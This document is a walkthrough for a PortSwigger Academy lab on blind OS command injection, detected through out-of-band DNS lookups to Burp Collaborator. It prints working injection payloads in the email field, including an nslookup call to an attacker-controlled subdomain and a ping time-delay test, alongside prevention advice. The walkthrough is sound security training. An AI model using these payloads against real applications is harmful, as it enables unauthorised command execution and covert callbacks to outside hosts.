# Command Injection - Lab #4: Blind OS Command Injection with Out-of-Band Interaction

**YouTube Tutorial:** [PortSwigger OS Command Injection Lab-4 | Blind OS command injection with out-of-band interaction](https://youtu.be/GUT03VBj7Vc?si=19ZwL8BaVUDJgCd2)

---

## 1. What is Blind OS Command Injection with Out-of-Band Interaction?

### Core Concept

Labs #2 and #3 both relied on a channel that was still reachable from the attacker's browser — response timing, or a writable/servable directory. This lab removes both of those: <cite index="19-1">the command is executed asynchronously and has no effect on the application's response,</cite> and <cite index="19-1">it is not possible to redirect output into a location that you can access.</cite> There is no in-band signal of any kind — no delay, no file to fetch, nothing.

Instead, the only way to confirm execution is to make the injected command **reach out over the network to a server you control** — an **Out-of-Band Application Security Testing (OAST)** channel, using **Burp Collaborator**.

```
            INJECTION                                   OUT-OF-BAND CONFIRMATION
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  email = x||nslookup        │          │  Attacker's Burp           │
   │  x.BURP-COLLABORATOR-       │          │  Collaborator server       │
   │  SUBDOMAIN||                │          │  (listening for DNS)       │
   └─────────────┬──────────────┘          └─────────────▲──────────────┘
                 ▼                                       │
   ┌────────────────────────────┐                        │
   │  Shell executes:            │                        │
   │  nslookup x.<subdomain>     │────────────────────────┘
   │  (async, no response impact)│   DNS lookup travels out
   └─────────────┬──────────────┘   over the network
                 ▼
   ┌────────────────────────────┐
   │  HTTP Response: unchanged,  │
   │  no delay, no output        │
   │  = still fully blind        │
   └────────────────────────────┘
```

The **DNS lookup itself is the oracle** — if the attacker's Collaborator server sees an incoming interaction from the target, the command executed, even though nothing came back in the HTTP response.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Feature:** The **feedback form** (Submit feedback) — same fields as Labs #2/#3: `name`, `email`, `subject`, `message`.
* **Vulnerable Parameter:** `email`, consistent with the previous labs in this series.
* **Blind Command Injection Mechanism:** <cite index="19-1">The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response.</cite>
* **Why timing/output redirection don't work here:** <cite index="19-1">It is not possible to redirect output into a location that you can access.</cite> There's no writable+servable folder like Lab #3, and because execution is asynchronous, a time-delay payload like Lab #2's won't reliably show up in the response either.
* **Detection Channel:** <cite index="19-1">Out-of-band interactions with an external domain</cite> — specifically a DNS lookup captured by Burp Collaborator.
* **Tooling requirement:** This lab needs <cite index="13-1">Burp Suite Professional</cite> — the free Community Edition's Collaborator client is not available.
* **End Goal:** <cite index="19-1">Exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.</cite>

### Root Cause & Impact

* **Root Cause:** Same underlying flaw as Labs #2 and #3 — unsanitized user input concatenated into a shell command — but here the deployment gives the attacker no in-band feedback loop at all.
* **Impact:** This lab proves that even a "fully silent" injection point is still exploitable. OOB/DNS-based detection is often the *only* viable technique in real-world blind injection scenarios where there's no timing signal and no accessible file system — and it can be extended (see Lab #5) to actually exfiltrate command output, not just confirm execution.

---

## 3. Attack Methods & Techniques (4-Phase Analysis)

* **Phase 1 — Confirm In-Band Channels Are Unavailable:** Rule out response-based and file-based detection so you know an OOB approach is required.
* **Phase 2 — Set Up the Burp Collaborator Listener:** Generate a unique Collaborator subdomain and keep the client open to poll for interactions.
* **Phase 3 — Inject the OOB Payload:** Send an `nslookup` command targeting the Collaborator subdomain through the `email` parameter.
* **Phase 4 — Check Collaborator for the Interaction:** Poll the Collaborator client for an incoming DNS interaction to confirm the command executed.

### Server Behavior

* **Feedback submission response:** Always identical — no delay, no output, no visible change, regardless of whether the payload succeeded.
* **Successful injection:** No change on the client side at all; the only observable effect is a DNS query arriving at the attacker's Collaborator server, entirely out-of-band from the HTTP conversation.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Feedback Submission Request

1. In the lab, click **"Submit feedback"** and fill the form with dummy values:

```
Name:      test
Email:     test@example.com
Subject:   test
Message:   test
```

2. Submit the form with **Burp Proxy interception ON**.
3. Send the captured `POST /feedback/submit` request to **Repeater**.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=test%40example.com&subject=test&message=test
```

### Step 2 — Phase 1: Confirm In-Band Channels Are Unavailable

1. Try a Lab #2-style time-delay payload on `email` first, purely to confirm this lab behaves differently:

```http
email=x||ping+-c+10+127.0.0.1||
```

2. **Observation:** The response returns immediately regardless — because <cite index="19-1">the command is executed asynchronously and has no effect on the application's response,</cite> timing tells you nothing useful here.
3. There is also no writable/servable image folder to redirect output into, unlike Lab #3.
4. **Conclusion:** This confirms you need an out-of-band channel, not an in-band one — proceed to Burp Collaborator.

### Step 3 — Phase 2: Set Up the Burp Collaborator Listener

1. In Burp Suite Professional, open **Burp menu → Burp Collaborator client**.
2. Click **Copy to Clipboard** to generate a unique Collaborator payload (a random subdomain of `burpcollaborator.net` or your configured server).
3. Leave the Collaborator client window open — you'll poll it after sending the injection.
4. (Optional) Set the polling interval low, e.g. every 1–2 seconds, so you notice the interaction quickly.

### Step 4 — Phase 3: Inject the OOB Payload

<cite index="19-1">Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||</cite>. <cite index="19-1">Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain</cite> directly into the request in Repeater, rather than typing it manually.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=x||nslookup+x.abcdefghij1234567890.oastify.com||&subject=test&message=test
```

* **Injected payload:** `x||nslookup x.<BURP-COLLABORATOR-SUBDOMAIN>||`
* **Why it works:** As in Labs #2/#3, `||` runs the right-hand command because the bogus left-hand command `x` fails. `nslookup` forces the server to perform a DNS lookup for the attacker-controlled subdomain, which routes through the internet back to Burp Collaborator's listener — completely independent of the HTTP response.
* Send the request. As expected, the response looks the same as any normal submission.

### Step 5 — Phase 4: Check Collaborator for the Interaction

1. Go back to the **Burp Collaborator client** window.
2. Click **Poll now** (or wait for automatic polling).
3. **Result:** A new DNS interaction appears, showing a lookup originating from the lab's server for your subdomain.
4. Click the interaction to view details — the **Description** tab shows the full domain that was looked up, confirming the command executed on the target.
5. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

* **This lab requires Burp Suite Professional:** <cite index="13-1">Burp Suite Professional is required to solve this lab!</cite> The Community Edition does not include a Collaborator client, so this is one of the few labs in the series where the free edition isn't enough.
* **Always use "Insert Collaborator payload":** Manually typing a Collaborator subdomain is error-prone. Right-click inside the request in Repeater and use **Insert Collaborator payload** so Burp tracks the exact subdomain it's listening for.
* **URL-encode the payload:** Spaces need to become `+` and pipes may need encoding depending on how the request body is structured — highlight and **Ctrl+U** in Repeater if the request breaks.
* **Give it a moment, then poll:** DNS lookups aren't always instant. If nothing shows up right away, wait a few seconds and click **Poll now** again before assuming the payload failed.
* **Firewall restrictions on Academy labs:** To prevent the Academy platform being used to attack third parties, PortSwigger's firewall blocks interactions between the labs and arbitrary external systems — you must use Burp Collaborator's default public server for this lab, not a self-hosted Collaborator server.
* **Don't confuse this with Lab #5:** This lab only requires proving that the DNS lookup happened. **Lab #5 (out-of-band data exfiltration)** goes further and encodes actual command output (e.g. `whoami`) into the subdomain itself, so you read the result back from the Collaborator interaction.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — blind, asynchronous, no accessible output at all;
// only detectable via out-of-band interactions
exec("mail " . $email . " ...");  // fire-and-forget, return value discarded

// ✅ SAFE — avoid shell calls entirely; use a mail library with native APIs,
// and never let unsanitized input reach any command execution function
```

* **Prevention summary:**
  * Never call OS commands from application code; use native APIs/libraries instead.
  * Restrict outbound network access (especially DNS to arbitrary domains) from application servers — this is what makes OOB detection possible for an attacker in the first place.
  * If shell calls are unavoidable, use argument-array APIs (no shell) plus strict allow-list validation of every field.
  * Monitor for anomalous outbound DNS/HTTP requests originating from application servers as a detective control.